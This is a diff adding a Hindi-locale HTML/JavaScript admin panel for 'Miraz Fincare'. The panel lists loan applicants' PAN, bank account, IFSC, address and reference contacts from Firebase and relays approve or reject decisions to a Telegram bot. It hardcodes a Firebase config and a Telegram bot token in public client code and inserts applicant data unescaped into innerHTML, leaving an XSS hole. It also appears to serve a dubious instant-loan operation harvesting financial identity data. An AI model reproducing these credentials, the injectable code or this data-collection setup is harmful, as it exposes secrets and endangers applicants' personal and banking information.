@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Miraz Fincare - Admin Controller</title>
+    <style>
+        :root { --primary: #1e3a8a; --primary-light: #3b82f6; --success: #10b981; --danger: #ef4444; --warning: #f59e0b; --bg: #0f172a; --card-bg: #1e293b; --text-main: #f8fafc; --text-muted: #94a3b8; --border: #334155; }
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text-main); min-height: 100vh; padding: 16px; }
+        .header { background: linear-gradient(135deg, var(--primary) 0%, #0f172a 100%); padding: 20px; border-radius: 16px; margin-bottom: 20px; text-align: center; box-shadow: 0 4px 20px rgba(30, 58, 138, 0.3); }
+        .header h1 { font-size: 1.4rem; font-weight: 800; margin-bottom: 4px; } .header p { color: var(--text-muted); font-size: 0.85rem; }
+        .status-indicator { display: inline-flex; align-items: center; gap: 8px; background: var(--card-bg); padding: 12px 20px; border-radius: 12px; margin-top: 12px; border: 2px solid var(--border); }
+        .status-dot { width: 10px; height: 10px; border-radius: 50%; background: var(--text-muted); }
+        .status-dot.active { background: var(--success); box-shadow: 0 0 10px var(--success); animation: blink 1.5s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+        .card { background: var(--card-bg); border-radius: 16px; padding: 20px; margin-bottom: 16px; border: 1px solid var(--border); }
+        .application-item { background: var(--card-bg); border-radius: 12px; padding: 16px; margin-bottom: 12px; border-left: 4px solid var(--warning); cursor: pointer; transition: all 0.2s; border: 1px solid var(--border); }
+        .application-item:active { transform: scale(0.98); }
+        .app-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
+        .app-name { font-weight: 700; font-size: 1rem; } .app-time { font-size: 0.75rem; color: var(--text-muted); }
+        .app-status { font-size: 0.75rem; padding: 4px 10px; border-radius: 20px; font-weight: 600; }
+        .status-pending { background: var(--warning); color: #000; }
+        .app-details { font-size: 0.85rem; color: var(--text-muted); line-height: 1.6; } .app-details strong { color: var(--text-main); }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; padding: 16px; overflow-y: auto; }
+        .modal.active { display: flex; align-items: flex-end; } @media (min-width: 600px) { .modal.active { align-items: center; justify-content: center; } }
+        .modal-content { background: var(--card-bg); border-radius: 20px; padding: 24px; width: 100%; max-width: 500px; max-height: 90vh; overflow-y: auto; animation: slideUp 0.3s ease; }
+        @keyframes slideUp { from { transform: translateY(100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; } .modal-title { font-size: 1.2rem; font-weight: 700; } .close-btn { background: none; border: none; color: var(--text-muted); font-size: 1.5rem; cursor: pointer; }
+        .form-group { margin-bottom: 16px; } .form-group label { display: block; font-size: 0.85rem; font-weight: 600; margin-bottom: 8px; color: var(--text-muted); }
+        .form-group input, .form-group textarea { width: 100%; padding: 12px; border: 1px solid var(--border); border-radius: 10px; background: var(--bg); color: var(--text-main); font-size: 1rem; outline: none; }
+        .action-buttons { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 24px; }
+        .btn { padding: 14px; border: none; border-radius: 12px; font-size: 1rem; font-weight: 700; cursor: pointer; transition: all 0.2s; }
+        .btn-approve { background: var(--success); color: white; } .btn-reject { background: var(--danger); color: white; } .btn:active { transform: scale(0.96); opacity: 0.9; }
+        .empty-state { text-align: center; padding: 40px 20px; color: var(--text-muted); } .empty-state-icon { font-size: 3rem; margin-bottom: 12px; opacity: 0.5; }
+        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 20px; }
+        .stat-card { background: var(--card-bg); padding: 16px; border-radius: 12px; text-align: center; border: 1px solid var(--border); }
+        .stat-value { font-size: 1.5rem; font-weight: 800; color: var(--primary-light); } .stat-label { font-size: 0.75rem; color: var(--text-muted); margin-top: 4px; }
+        .full-details { background: var(--bg); padding: 16px; border-radius: 12px; margin: 16px 0; font-size: 0.85rem; line-height: 1.8; }
+        .full-details-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid var(--border); } .full-details-row:last-child { border-bottom: none; }
+        .detail-label { color: var(--text-muted); } .detail-value { font-weight: 600; color: var(--text-main); word-break: break-all; text-align: right; max-width: 60%;}
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🏦 Miraz Fincare Admin</h1>
+        <p>Loan Application Controller</p>
+        <div class="status-indicator">
+            <div class="status-dot" id="statusDot"></div>
+            <span id="statusText">Waiting for applications...</span>
+        </div>
+    </div>
+    <div class="stats">
+        <div class="stat-card"><div class="stat-value" id="totalApps">0</div><div class="stat-label">Total</div></div>
+        <div class="stat-card"><div class="stat-value" id="pendingApps">0</div><div class="stat-label">Pending</div></div>
+        <div class="stat-card"><div class="stat-value" id="approvedApps">0</div><div class="stat-label">Approved</div></div>
+    </div>
+    <div class="card">
+        <h2 style="margin-bottom: 16px; font-size: 1.1rem;">📋 Applications</h2>
+        <div id="applicationsList"><div class="empty-state"><div class="empty-state-icon">📭</div><p>No applications yet</p></div></div>
+    </div>
+
+    <div class="modal" id="appModal">
+        <div class="modal-content">
+            <div class="modal-header"><div class="modal-title">Application Details</div><button class="close-btn" onclick="closeModal()">&times;</button></div>
+            <div class="full-details" id="fullDetails"></div>
+            <div class="form-group"><label>💰 Loan Amount (₹)</label><input type="number" id="loanAmount" value="33000"></div>
+            <div class="form-group"><label>✅ Approval Message</label><textarea id="approvalMessage" rows="3">Your application has been successfully verified.</textarea></div>
+            <div class="form-group"><label>❌ Rejection Message</label><textarea id="rejectionMessage" rows="3">Sorry, Your Application is Rejected But Don't worry You can Reapply In Next 3 Days We'll let you know via Email or WhatsApp.</textarea></div>
+            <div class="action-buttons">
+                <button class="btn btn-approve" onclick="approveApplication()">✅ Approve</button>
+                <button class="btn btn-reject" onclick="rejectApplication()"> Reject</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyA78esE90GtN4qzzthQZRQAFsxvCnXY_jY",
+            authDomain: "mirazfinance.firebaseapp.com",
+            databaseURL: "https://mirazfinance-default-rtdb.firebaseio.com",
+            projectId: "mirazfinance",
+            storageBucket: "mirazfinance.firebasestorage.app",
+            messagingSenderId: "885659621417",
+            appId: "1:885659621417:web:10dd2193b9cf340a6a6438"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        const BOT_TOKEN = "8870596631:AAERd6vwiJakDlI5ylCbRiid5mXBNUcfuWw";
+        const CHAT_ID = "-1003994060695";
+        let applications = {};
+        let currentAppId = null;
+
+        database.ref('applications').on('value', (snapshot) => {
+            applications = snapshot.val() || {};
+            renderApplications();
+            updateStats();
+        });
+
+        function renderApplications() {
+            const container = document.getElementById('applicationsList');
+            const pendingApps = Object.keys(applications).filter(key => applications[key].status === 'pending');
+            
+            if (pendingApps.length === 0) {
+                container.innerHTML = `<div class="empty-state"><div class="empty-state-icon">📭</div><p>No pending applications</p></div>`;
+                document.getElementById('statusDot').classList.remove('active');
+                document.getElementById('statusText').textContent = 'No new applications';
+                return;
+            }
+
+            document.getElementById('statusDot').classList.add('active');
+            document.getElementById('statusText').textContent = `🔔 ${pendingApps.length} New Application(s) Waiting!`;
+
+            container.innerHTML = pendingApps.map(key => {
+                const app = applications[key];
+                return `
+                <div class="application-item" onclick="openApplication('${key}')">
+                    <div class="app-header">
+                        <div><div class="app-name">${app.fullName}</div><div class="app-time">${new Date(app.timestamp).toLocaleString('en-IN')}</div></div>
+                        <span class="app-status status-pending">PENDING</span>
+                    </div>
+                    <div class="app-details"><strong>Mobile:</strong> ${app.mobile}<br><strong>PAN:</strong> ${app.panNumber}<br><strong>Bank:</strong> ${app.bankName || 'Pending'}</div>
+                </div>`;
+            }).join('');
+        }
+
+        function updateStats() {
+            const allApps = Object.values(applications);
+            document.getElementById('totalApps').textContent = allApps.length;
+            document.getElementById('pendingApps').textContent = allApps.filter(a => a.status === 'pending').length;
+            document.getElementById('approvedApps').textContent = allApps.filter(a => a.status === 'approved').length;
+        }
+
+        function openApplication(appId) {
+            const app = applications[appId]; if (!app) return; currentAppId = appId;
+            document.getElementById('fullDetails').innerHTML = `
+                <div class="full-details-row"><span class="detail-label">Full Name</span><span class="detail-value">${app.fullName}</span></div>
+                <div class="full-details-row"><span class="detail-label">Mobile</span><span class="detail-value">${app.mobile}</span></div>
+                <div class="full-details-row"><span class="detail-label">Email</span><span class="detail-value">${app.email}</span></div>
+                <div class="full-details-row"><span class="detail-label">Address</span><span class="detail-value">${app.address}</span></div>
+                <div class="full-details-row"><span class="detail-label">PAN</span><span class="detail-value">${app.panNumber}</span></div>
+                <div class="full-details-row"><span class="detail-label">Bank</span><span class="detail-value">${app.bankName || '-'}</span></div>
+                <div class="full-details-row"><span class="detail-label">Acc No</span><span class="detail-value">${app.accNo || '-'}</span></div>
+                <div class="full-details-row"><span class="detail-label">IFSC</span><span class="detail-value">${app.ifsc || '-'}</span></div>
+                <div class="full-details-row"><span class="detail-label">Ref 1</span><span class="detail-value">${app.ref1Name} (${app.ref1Mobile})</span></div>
+                <div class="full-details-row"><span class="detail-label">Ref 2</span><span class="detail-value">${app.ref2Name} (${app.ref2Mobile})</span></div>
+            `;
+            document.getElementById('appModal').classList.add('active');
+        }
+
+        function closeModal() { document.getElementById('appModal').classList.remove('active'); currentAppId = null; }
+
+        function approveApplication() {
+            if (!currentAppId) return;
+            const amount = document.getElementById('loanAmount').value;
+            const customMessage = document.getElementById('approvalMessage').value;
+            database.ref('applications/' + currentAppId).update({ status: 'approved', approvedAmount: amount, approvalMessage: customMessage, decisionTime: firebase.database.ServerValue.TIMESTAMP });
+            sendTelegramNotification(applications[currentAppId], 'approved', amount);
+            closeModal();
+        }
+
+        function rejectApplication() {
+            if (!currentAppId) return;
+            const customMessage = document.getElementById('rejectionMessage').value;
+            database.ref('applications/' + currentAppId).update({ status: 'rejected', rejectionMessage: customMessage, decisionTime: firebase.database.ServerValue.TIMESTAMP });
+            sendTelegramNotification(applications[currentAppId], 'rejected');
+            closeModal();
+        }
+
+        async function sendTelegramNotification(app, action, amount = '') {
+            const message = action === 'approved' 
+                ? `✅ *APPLICATION APPROVED*\n\n👤 Name: ${app.fullName}\n Mobile: ${app.mobile}\n💰 Amount: ₹${amount}\n\n📝 Message: ${app.approvalMessage}`
+                : `❌ *APPLICATION REJECTED*\n\n👤 Name: ${app.fullName}\n📱 Mobile: ${app.mobile}\n\n📝 Message: ${app.rejectionMessage}`;
+            try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }) }); } catch (error) { console.error(error); }
+        }
+
+        document.getElementById('appModal').addEventListener('click', function(e) { if (e.target === this) closeModal(); });
+    </script>
+</body>
+</html>
